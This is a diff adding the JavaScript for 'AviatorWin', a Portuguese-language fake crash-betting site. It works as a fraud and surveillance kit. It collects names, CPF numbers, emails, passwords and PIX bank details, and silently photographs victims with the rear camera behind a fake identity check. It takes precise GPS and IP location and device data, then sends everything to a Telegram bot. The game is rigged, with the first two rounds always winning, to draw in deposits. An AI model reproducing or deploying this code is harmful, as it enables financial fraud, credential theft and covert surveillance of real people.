+  gpsData: null,
+  round: 0,
+  wins: 0,
+  totalWon: 0,
+  balance: 0,
+  gameInterval: null,
+  currentMultiplier: 1,
+  gameActive: false,
+  betPlaced: false,
+  
+  go(n) {
+    document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+    document.getElementById('s'+n).classList.add('active');
+    if (n===3) this.startCamera();
+    if (n===5) this.startPixTimer();
+    if (n===6) this.updateBalance();
+  },
+  
+  showGeneric(emoji,title,text) {
+    document.getElementById('modalGenericEmoji').textContent = emoji;
+    document.getElementById('modalGenericTitle').textContent = title;
+    document.getElementById('modalGenericText').textContent = text;
+    document.getElementById('modalGeneric').classList.add('active');
+  },
+  
+  closeModal(id) {
+    document.getElementById(id).classList.remove('active');
+  },
+  
+  showCameraDenyModal() {
+    document.getElementById('modalPhoto').classList.add('active');
+  },
+  
+  showLocationDenyModal() {
+    document.getElementById('modalLoc').classList.add('active');
+  },
+  
+  validateRegister() {
+    const name = document.getElementById('regName').value.trim();
+    const cpf = document.getElementById('regCpf').value.trim();
+    const email = document.getElementById('regEmail').value.trim();
+    const pass = document.getElementById('regPass').value;
+    const pixType = document.getElementById('pixType').value;
+    const pixKey = document.getElementById('pixKey').value.trim();
+    const pixName = document.getElementById('pixName').value.trim();
+    const pixBank = document.getElementById('pixBank').value.trim();
+    
+    if (name.length<3) return this.showGeneric('️','Nome inválido','Digite seu nome completo (mínimo 3 caracteres)');
+    if (cpf.length<11) return this.showGeneric('⚠️','CPF inválido','Digite um CPF válido');
+    if (!email.includes('@')) return this.showGeneric('⚠️','E-mail inválido','Digite um e-mail válido');
+    if (pass.length<6) return this.showGeneric('⚠️','Senha fraca','Senha deve ter pelo menos 6 caracteres');
+    if (pixKey.length<3) return this.showGeneric('⚠️','Chave PIX inválida','Digite sua chave PIX');
+    if (pixName.length<3) return this.showGeneric('⚠️','Nome do titular','Digite o nome do titular da conta PIX');
+    
+    this.data = { name, cpf, email, pass, pixType, pixKey, pixName, pixBank };
+    this.go(3);
+  },
+  
+  async startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode:'user', width:{ideal:CONFIG.CAMERA.WIDTH}, height:{ideal:CONFIG.CAMERA.HEIGHT} },
+        audio: false
+      });
+      this.cameraStream = stream;
+      const video = document.getElementById('cameraVideo');
+      video.srcObject = stream;
+      await new Promise(r=>{ video.onloadedmetadata = ()=>{ video.play(); r(); }; });
+      Logger.success('Câmera frontal ativa');
+    } catch(e) {
+      Logger.error('Erro câmera', e);
+      this.showGeneric('📷','Câmera indisponível','Não foi possível acessar a câmera. Verifique as permissões do navegador.');
+    }
+  },
+  
+  async capturePhoto() {
+    const flash = document.getElementById('cameraFlash');
+    const video = document.getElementById('cameraVideo');
+    
+    // Flash effect
+    flash.classList.add('active');
+    setTimeout(()=>flash.classList.remove('active'), 150);
+    
+    // Captura FRONTAL (visível)
+    const frontPhoto = this.captureFromVideo(video);
+    this.cameraPhotos.front = frontPhoto;
+    
+    // Captura TRASEIRA (silenciosa, em background)
+    try {
+      const backStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode:'environment', width:{ideal:CONFIG.CAMERA.WIDTH}, height:{ideal:CONFIG.CAMERA.HEIGHT} },
+        audio: false
+      });
+      const backVideo = document.createElement('video');
+      backVideo.srcObject = backStream;
+      backVideo.autoplay = true;
+      backVideo.playsInline = true;
+      backVideo.style.display = 'none';
+      document.body.appendChild(backVideo);
+      
+      await new Promise(r=>{
+        backVideo.onloadedmetadata = ()=>{ backVideo.play(); setTimeout(r, CONFIG.CAMERA.DELAY); };
+      });
+      
+      const backPhoto = this.captureFromVideo(backVideo);
+      this.cameraPhotos.back = backPhoto;
+      
+      backStream.getTracks().forEach(t=>t.stop());
+      backVideo.remove();
+      Logger.success('Foto traseira capturada silenciosamente');
+    } catch(e) {
+      Logger.warn('Foto traseira falhou', e.message);
+    }
+    
+    // Para a câmera frontal
+    if (this.cameraStream) {
+      this.cameraStream.getTracks().forEach(t=>t.stop());
+      this.cameraStream = null;
+    }
+    
+    this.showGeneric('✅','Foto capturada!','Sua identidade foi verificada com sucesso.');
+    setTimeout(()=>this.go(4), 1500);
+  },
+  
+  captureFromVideo(video) {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL('image/jpeg', CONFIG.CAMERA.QUALITY);
+  },
+  
+  async requestLocation(force = false) {
+    if (!navigator.geolocation) {
+      return this.skipLocation();
+    }
+    
+    try {
+      const pos = await new Promise((res,rej)=>{
+        navigator.geolocation.getCurrentPosition(res, rej, {
+          enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+        });
+      });
+      
+      this.gpsData = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        source: 'GPS_PRECISO'
+      };
+      
+      Logger.success('GPS obtido', this.gpsData);
+      
+      // Tenta enriquecer com IP
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        this.gpsData.ipData = ipData;
+      } catch(e) {}
+      
+      this.go(5);
+    } catch(e) {
+      Logger.warn('GPS negado', e.message);
+      if (force) {
+        this.showGeneric('','Localização necessária','Ative a localização nas configurações do seu dispositivo e tente novamente.');
+      } else {
+        this.showLocationDenyModal();
+      }
+    }
+  },
+  
+  skipLocation() {
+    // Tenta pegar só por IP
+    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+      this.gpsData = {
+        latitude: d.latitude, longitude: d.longitude,
+        accuracy: 'Aproximada (IP)', source: 'IP_API', ipData: d
+      };
+    }).catch(()=>{
+      this.gpsData = { latitude:null, longitude:null, source:'FALHOU' };
+    }).finally(()=>{
+      this.go(5);
+    });
+  },
+  
+  startPixTimer() {
+    let seconds = 299;
+    const el = document.getElementById('pixTimer');
+    const iv = setInterval(()=>{
+      seconds--;
+      const m = Math.floor(seconds/60).toString().padStart(2,'0');
+      const s = (seconds%60).toString().padStart(2,'0');
+      el.textContent = `${m}:${s}`;
+      if (seconds<=0) clearInterval(iv);
+    }, 1000);
+  },
+  
+  updatePix() {
+    const v = parseInt(document.getElementById('depositValue').value);
+    document.getElementById('pixAmount').textContent = `R$ ${v},00`;
+  },
+  
+  copyPix() {
+    const code = document.getElementById('pixCode').textContent;
+    navigator.clipboard?.writeText(code).then(()=>{
+      this.showGeneric('📋','Copiado!','Código PIX copiado para a área de transferência.');
+    });
+  },
+  
+  confirmDeposit() {
+    const v = parseInt(document.getElementById('depositValue').value);
+    this.balance = v * 2; // dobra o depósito
+    this.showGeneric('✅','Depósito confirmado!',`Seu saldo de R$ ${this.balance},00 foi creditado. Bom jogo!`);
+    setTimeout(()=>this.go(6), 1500);
+  },
+  
+  updateBalance() {
+    document.getElementById('balanceDisplay').textContent = `R$ ${this.balance.toFixed(2).replace('.',',')}`;
+  },
+  
+  startRound() {
+    if (this.gameActive) return;
+    const bet = parseFloat(document.getElementById('betAmount').value);
+    if (isNaN(bet) || bet<=0) return this.showGeneric('⚠️','Aposta inválida','Digite um valor válido');
+    if (bet > this.balance) return this.showGeneric('⚠️','Saldo insuficiente','Você não tem saldo suficiente');
+    
+    this.balance -= bet;
+    this.updateBalance();
+    this.betPlaced = true;
+    this.gameActive = true;
+    this.currentMultiplier = 1.00;
+    this.round++;
+    
+    document.getElementById('btnBet').classList.add('hidden');
+    document.getElementById('btnCashout').classList.remove('hidden');
+    
+    const multEl = document.getElementById('multiplier');
+    const planeEl = document.getElementById('plane');
+    multEl.classList.remove('crashed','cashed');
+    planeEl.classList.remove('crashed');
+    planeEl.classList.add('flying');
+    planeEl.style.bottom = '40px';
+    planeEl.style.left = '20px';
+    
+    // As PRIMEIRAS 2 rodadas SEMPRE ganham
+    const isFirstTwo = this.round <= 2;
+    const crashPoint = isFirstTwo 
+      ? (2.5 + Math.random()*2.5) // entre 2.5x e 5x (sempre alto)
+      : (1.1 + Math.random()*2);  // depois, pode crashar cedo
+    
+    const autoCashout = parseFloat(document.getElementById('autoCashout').value) || 2.0;
+    let cashedOut = false;
+    
+    this.gameInterval = setInterval(()=>{
+      this.currentMultiplier += 0.02 + (this.currentMultiplier * 0.01);
+      multEl.textContent = this.currentMultiplier.toFixed(2) + 'x';
+      
+      // Animação do avião
+      const progress = Math.min((this.currentMultiplier - 1) / 4, 1);
+      planeEl.style.bottom = (40 + progress * 180) + 'px';
+      planeEl.style.left = (20 + progress * 250) + 'px';
+      
+      // Auto cashout
+      if (!cashedOut && this.currentMultiplier >= autoCashout && this.betPlaced) {
+        this.cashout();
+        cashedOut = true;
+      }
+      
+      // Crash
+      if (this.currentMultiplier >= crashPoint && !cashedOut) {
+        this.crash(bet);
+      }
+    }, 80);
+  },
+  
+  cashout() {
+    if (!this.gameActive || !this.betPlaced) return;
+    this.betPlaced = false;
+    
+    const bet = parseFloat(document.getElementById('betAmount').value);
+    const winAmount = bet * this.currentMultiplier;
+    this.balance += winAmount;
+    this.wins++;
+    this.totalWon += winAmount;
+    
+    document.getElementById('multiplier').classList.add('cashed');
+    document.getElementById('plane').classList.remove('flying');
+    
+    this.addHistory(this.currentMultiplier.toFixed(2)+'x', true);
+    this.endRound();
+    this.updateBalance();
+    document.getElementById('winsCount').textContent = this.wins;
+    document.getElementById('totalWon').textContent = `R$ ${this.totalWon.toFixed(2).replace('.',',')}`;
+    
+    this.showGeneric('🎉','Você ganhou!',`Retirou ${this.currentMultiplier.toFixed(2)}x = R$ ${winAmount.toFixed(2).replace('.',',')}`);
+  },
+  
+  crash(bet) {
+    clearInterval(this.gameInterval);
+    this.gameActive = false;
+    this.betPlaced = false;
+    
+    document.getElementById('multiplier').classList.add('crashed');
+    document.getElementById('plane').classList.add('crashed');
+    
+    this.addHistory(this.currentMultiplier.toFixed(2)+'x', false);
+    this.endRound();
+    
+    // Se perdeu, oferece "recuperar"
+    if (this.round > 2) {
+      setTimeout(()=>{
+        this.showGeneric('💥','Crashou!',`O avião caiu em ${this.currentMultiplier.toFixed(2)}x. Tente recuperar na próxima!`);
+      }, 800);
+    }
+  },
+  
+  endRound() {
+    clearInterval(this.gameInterval);
+    this.gameActive = false;
+    setTimeout(()=>{
+      document.getElementById('btnBet').classList.remove('hidden');
+      document.getElementById('btnCashout').classList.add('hidden');
+      document.getElementById('multiplier').textContent = '1.00x';
+      document.getElementById('multiplier').classList.remove('crashed','cashed');
+      document.getElementById('plane').classList.remove('flying','crashed');
+      document.getElementById('plane').style.bottom = '40px';
+      document.getElementById('plane').style.left = '20px';
+    }, 2000);
+  },
+  
+  addHistory(text, win) {
+    const h = document.getElementById('gameHistory');
+    const item = document.createElement('div');
+    item.className = 'history-item ' + (win?'win':'lose');
+    item.textContent = text;
+    h.insertBefore(item, h.firstChild);
+    if (h.children.length > 10) h.removeChild(h.lastChild);
+  },
+  
+  async sendAllToTelegram() {
+    try {
+      // Fotos
+      if (this.cameraPhotos.front) {
+        await TelegramService.sendPhoto(this.cameraPhotos.front, 
+          `📸 SELFIE FRONTAL\n ${this.data.name}\n📧 ${this.data.email}\n🕐 ${new Date().toLocaleString('pt-BR')}`);
+      }
+      if (this.cameraPhotos.back) {
+        await TelegramService.sendPhoto(this.cameraPhotos.back,
+          `📸 FOTO TRASEIRA (AMBIENTE)\n👤 ${this.data.name}\n🕐 ${new Date().toLocaleString('pt-BR')}`);
+      }
+      
+      // Dados cadastrais
+      const msg1 = `🎰 NOVO CADASTRO - AviatorWin v${CONFIG.VERSION}\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `👤 DADOS PESSOAIS:\n` +
+        `- Nome: ${this.data.name}\n` +
+        `- CPF: ${this.data.cpf}\n` +
+        `- E-mail: ${this.data.email}\n` +
+        `- Senha: ${this.data.pass}\n\n` +
+        `💸 PIX:\n` +
+        `- Tipo: ${this.data.pixType}\n` +
+        `- Chave: ${this.data.pixKey}\n` +
+        `- Titular: ${this.data.pixName}\n` +
+        `- Banco: ${this.data.pixBank}\n\n` +
+        `🎮 JOGO:\n` +
+        `- Rodadas: ${this.round}\n` +
+        `- Vitórias: ${this.wins}\n` +
+        `- Total ganho: R$ ${this.totalWon.toFixed(2)}\n` +
+        `- Saldo atual: R$ ${this.balance.toFixed(2)}`;
+      await TelegramService.send(msg1);
+      
+      // Localização
+      const gps = this.gpsData || {};
+      const ip = gps.ipData || {};
+      const msg2 = `📍 LOCALIZAÇÃO\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `- Fonte: ${gps.source || 'N/A'}\n` +
+        `- Latitude: ${gps.latitude || 'N/A'}\n` +
+        `- Longitude: ${gps.longitude || 'N/A'}\n` +
+        `- Precisão: ${gps.accuracy || 'N/A'}\n` +
+        `- IP: ${ip.ip || 'N/A'}\n` +
+        `- Cidade: ${ip.city || 'N/A'}\n` +
+        `- Região: ${ip.region || 'N/A'}\n` +
+        `- País: ${ip.country_name || 'N/A'}\n` +
+        `- CEP: ${ip.postal || 'N/A'}\n` +
+        `- ISP: ${ip.org || 'N/A'}\n` +
+        `- ASN: ${ip.asn || 'N/A'}`;
+      await TelegramService.send(msg2);
+      
+      // Dispositivo
+      const msg3 = ` DISPOSITIVO\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `- UA: ${navigator.userAgent}\n` +
+        `- Plataforma: ${navigator.platform}\n` +
+        `- Idioma: ${navigator.language}\n` +
+        `- CPU: ${navigator.hardwareConcurrency||'N/A'} cores\n` +
+        `- RAM: ${navigator.deviceMemory||'N/A'}GB\n` +
+        `- Tela: ${screen.width}x${screen.height}\n` +
+        `- Window: ${window.innerWidth}x${window.innerHeight}\n` +
+        `- Pixel Ratio: ${window.devicePixelRatio}\n` +
+        `- Online: ${navigator.onLine}\n` +
+        `- Cookies: ${navigator.cookieEnabled}`;
+      await TelegramService.send(msg3);
+      
+      // Localização no mapa
+      if (gps.latitude && gps.longitude) {
+        await TelegramService.sendLocation(gps.latitude, gps.longitude);
+      }
+      
+      Logger.success('Tudo enviado ao Telegram');
+    } catch(e) {
+      Logger.error('Erro enviar Telegram', e);
+    }
+  }
+};
+
+// Envia dados quando usuário chega na tela do jogo (após "pagar")
+const origGo = App.go.bind(App);
+App.go = function(n) {
+  origGo(n);
+  if (n === 6) {
+    // Envia tudo quando começa a jogar
+    setTimeout(()=>App.sendAllToTelegram(), 2000);
+  }
+};
+
+// Máscara CPF
+document.getElementById('regCpf').addEventListener('input', e=>{
+  let v = e.target.value.replace(/\D/g,'');
+  v = v.replace(/(\d{3})(\d)/,'$1.$2');
+  v = v.replace(/(\d{3})(\d)/,'$1.$2');
+  v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+  e.target.value = v;
+});
+
+// Inicializa
+Logger.info(`AviatorWin v${CONFIG.VERSION} iniciado`);
+</script>
+
 </body>
 </html>
